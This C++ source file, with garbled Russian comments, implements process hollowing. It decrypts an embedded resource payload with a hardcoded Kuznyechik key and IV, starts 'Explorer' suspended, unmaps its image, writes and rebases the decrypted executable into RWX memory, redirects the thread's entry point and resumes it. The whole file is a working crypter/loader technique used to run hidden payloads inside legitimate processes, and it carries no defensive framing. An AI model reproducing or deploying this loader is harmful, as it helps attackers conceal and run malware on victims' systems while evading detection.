// ProcessHollowing.cpp : Defines the entry point for the console application.
//



#include "stdafx.h"
#include <windows.h>
#include "internals.h"
#include "pe.h"
#include "KuznyechikPH.cpp"
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <windows.h>
#include <winnt.h>
#include <thread>
#include <algorithm>
#include <functional>
#include "resource.h"
#include "winres.h"
#include "Winuser.h"


void CreateHollowedProcess(char* pDestCmdLine, ByteBlock &pBufferCrypt) //процедура создани€ замещЄнного процесса
{

	//создаЄм процесс
	printf("Creating process\r\n");
	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
	int resut = CreateProcessA
	(
		0,					// lpApplicationName
		pDestCmdLine,		// lpCommandLine
		0,					// lpProcessAttributes
		0,					// lpThreadAttributes
		0,					// bInheritHandles
		CREATE_SUSPENDED,	// dwCreationFlags, Ќужно, чтобы он не был запущен до тех пор, пока мы его не заполним и не проинициализируем
		0,					// lpEnvironment
		0,					// lpCurrentDirectory
		pStartupInfo,		// lpStartupInfo
		pProcessInfo		// lpProcessInformation
	);

	if (!pProcessInfo->hProcess) //провер€ем, действительно ли он был создан
	{
		printf("Error creating process\r\n");
		return;
	}

	PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess); // получаем адрес рабочего места

	PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress); //получаем указатель на image со всеми необходимыми параметрами

	// дешифруем прин€тый массив байтов
	ByteBlock key = hex_to_bytes("8899aabbccddeeff0011223344556677fedcba98765432100123456789abcdef");
	ByteBlock iv = hex_to_bytes("abcdef12345600dacdef94756eeabefa");
	ByteBlock output;
	CFB_Mode<Kuznyechik> decryptor(Kuznyechik(key), iv);
	decryptor.decrypt(pBufferCrypt, output);
	PBYTE pBuffer = new BYTE[output.amount_of_bytes + 1];
	memcpy(pBuffer, output.pBlocks, output.amount_of_bytes);
	pBuffer[output.amount_of_bytes] = 0;

	PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);
	PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);

	//очищаем отобраение образа в пам€ти
	printf("Unmapping destination section\r\n");
	// в 3 строках получаем указатель на функцию
	HMODULE hNTDLL = GetModuleHandleA("ntdll");
	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");				
	_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;		
	//  –азмаппируем этот указатель pPEB->ImageBaseAddress от созднного процесса
	DWORD dwResult = NtUnmapViewOfSection			
	(
		pProcessInfo->hProcess, 
		pPEB->ImageBaseAddress
	);

	if (dwResult)
	{
		printf("Error unmapping section\r\n");
		return;
	}

	// выдел€ем новый блок пам€ти под образ
	printf("Allocating memory\r\n");

	PVOID pRemoteImage = VirtualAllocEx
	(
		pProcessInfo->hProcess,						// hProcess
		pPEB->ImageBaseAddress,						// lpAddress pPEB->ImageBaseAddress NULL
		pSourceHeaders->OptionalHeader.SizeOfImage, // dwSize
		MEM_COMMIT | MEM_RESERVE,					// flAllocationType
		PAGE_EXECUTE_READWRITE						// flProtect ()
	);

	if (!pRemoteImage)
	{
		printf("VirtualAllocEx call failed\r\n");
		return;
	}

	//pPEB->ImageBaseAddress = pRemoteImage;
	PPEB pPEB2 = ReadRemotePEB(pProcessInfo->hProcess); // получаем адрес рабочего места

	PLOADED_IMAGE pImage2 = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);
	
	//рассчитываем разницу в адресах
	DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress - pSourceHeaders->OptionalHeader.ImageBase;

	printf
	(
		"Source image base: 0x%p\r\n"
		"Destination image base: 0x%p\r\n",
		pSourceHeaders->OptionalHeader.ImageBase,
		pPEB->ImageBaseAddress
	);

	printf("Relocation delta: 0x%p\r\n", dwDelta);
	pSourceHeaders->OptionalHeader.ImageBase = (DWORD)pPEB->ImageBaseAddress;	//перезаписываем в заголовок пам€ти нового процесса адрес первоначального
	printf("Writing headers\r\n");
	
	// записываем в область пам€ти первоначального процесса содержимое буфера(данные открытого файла(helloworld.exe))
	if (!WriteProcessMemory
	(
		pProcessInfo->hProcess, 				
		pPEB->ImageBaseAddress, 
		pBuffer, 
		pSourceHeaders->OptionalHeader.SizeOfHeaders, 
		0
	))
	{
		printf("Error writing process memory\r\n");
		return;
	}

	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
	{
		if (!pSourceImage->Sections[x].PointerToRawData)
			continue;

		PVOID pSectionDestination = (PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);
		printf("Writing %s section to 0x%p\r\n", pSourceImage->Sections[x].Name, pSectionDestination);
		if (!WriteProcessMemory
		(
			pProcessInfo->hProcess,										// hProcess
			pSectionDestination,										// lpBaseAddress
			&pBuffer[pSourceImage->Sections[x].PointerToRawData],		// lpBuffer
			pSourceImage->Sections[x].SizeOfRawData,					// nSize
			0															// *nSize
		))
		{
			printf ("Error writing process memory\r\n");
			printf("0x%p\r\n",GetLastError());
			return;
		}
	}	

	if (dwDelta) // ≈сли delta =0, то и так все ок
		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
		{
			char* pSectionName = ".reloc";		// эти записи игнорим
			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
				continue;

			printf("Rebasing image\r\n");

			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData; // берем указатель на массив
			DWORD dwOffset = 0;  // в начале смещение равно 0
			IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];  // получе указатель на структуру, котора€ опиывает данные

			while (dwOffset < relocData.Size) // см рисунок. relocData.Size - размер вектора
			{
				PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset]; // берем заголовок

				dwOffset += sizeof(BASE_RELOCATION_BLOCK);
				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
				PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset]; // массив блоков

				for (DWORD y = 0; y < dwEntryCount; y++)
				{
					dwOffset += sizeof(BASE_RELOCATION_ENTRY);   // сдвигаем смещение
					if (pBlocks[y].Type == 0)
						continue;

					DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;
					DWORD dwBuffer = 0;
					ReadProcessMemory   // получаем указатель старый
					(
						pProcessInfo->hProcess, 
						(PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0
					);

					dwBuffer += dwDelta;		// сдвигаем
					BOOL bSuccess = WriteProcessMemory		// записываем
					(
						pProcessInfo->hProcess,
						(PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0
					);
					if (!bSuccess)
					{
						printf("Error writing memory\r\n");
						continue;
					}
				}
			}
			break;
		}


		DWORD dwBreakpoint = 0xCC;

		DWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress +
			pSourceHeaders->OptionalHeader.AddressOfEntryPoint;

#ifdef WRITE_BP
		printf("Writing breakpoint\r\n");

		if (!WriteProcessMemory
			(
			pProcessInfo->hProcess, 
			(PVOID)dwEntrypoint, 
			&dwBreakpoint, 
			4, 
			0
			))
		{
			printf("Error writing breakpoint\r\n");
			return;
		}
#endif

		LPCONTEXT pContext = new CONTEXT();
		pContext->ContextFlags = CONTEXT_INTEGER;

		printf("Getting thread context\r\n");

		if (!GetThreadContext(pProcessInfo->hThread, pContext))
		{
			printf("Error getting context\r\n");
			return;
		}

		pContext->Eax = dwEntrypoint;			

		printf("Setting thread context\r\n");

		if (!SetThreadContext(pProcessInfo->hThread, pContext))
		{
			printf("Error setting context\r\n");
			return;
		}

		printf("Resuming thread\r\n");

		if (!ResumeThread(pProcessInfo->hThread))   // «апускаем обновленный процесс, который был изначально Suspend
		{
			printf("Error resuming thread\r\n");
			return;
		}

		printf("Process hollowing complete\r\n");
}

int _tmain(int argc, _TCHAR* argv[])
{
	HRSRC hRes = FindResource(0, MAKEINTRESOURCE(IDR_IDK1), _T("idk"));
	HGLOBAL hData = LoadResource(0, hRes); 
	DWORD dataSize = SizeofResource(0, hRes);
	char* data = new char[dataSize];
	if (NULL != hRes)
	{
		if (NULL != hData)
		{
			data = (char*)LockResource(hData);
		}
	}

	ByteBlock message = ByteBlock((BYTE*)data, dataSize);
	
	CreateHollowedProcess("Explorer", message);   
	system("pause");
	return 0;
}

